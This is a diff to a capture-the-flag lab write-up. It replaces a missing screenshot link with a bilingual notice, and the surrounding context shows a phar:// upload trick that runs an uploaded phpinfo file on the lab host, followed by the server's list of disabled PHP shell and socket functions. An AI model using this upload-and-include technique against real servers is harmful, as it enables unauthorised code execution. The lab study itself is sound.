@@ -207,7 +207,10 @@ To test this, I’ll try creating a file that just calls `phpinfo`, and call it 
 `<?php phpinfo(); ?>`
 put it into a zip archive and upload it.
 Now on visiting `http://dev.siteisup.htb/?page=phar://uploads/a26d8923adbfe58243ff1fe2b12d30a4/phpinfo.wither/phpinfo`
-![](images/Pasted%20image%2020250206154718.png)
+> ⚠️ **Captura no disponible / Screenshot unavailable:** `images/Pasted image 20250206154718.png` no está en el
+> repositorio — nunca se versionó. El texto alrededor es lo que hay. /
+> Not in the repository — never committed. The surrounding text is what exists.
+
 Then we can check the `disable_functions`
 ```
 pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
